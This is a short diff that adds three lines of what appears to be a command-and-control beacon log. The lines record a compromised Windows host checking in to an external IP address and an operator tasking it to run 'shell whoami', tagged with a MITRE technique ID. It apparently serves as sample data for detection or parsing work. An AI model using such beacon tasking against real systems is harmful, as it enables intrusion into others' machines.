@@ -1,0 +1,3 @@
+12/10 18:00:07 UTC [metadata] 103.100.176.25 <- 192.168.37.129; computer: DESKTOP-IMIAIHI; user: jhc; process: jhc.exe; pid: 2928; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/10 18:04:09 UTC [input] <jhc> shell whoami
+12/10 18:04:09 UTC [task] <T1059> Tasked beacon to run: whoami
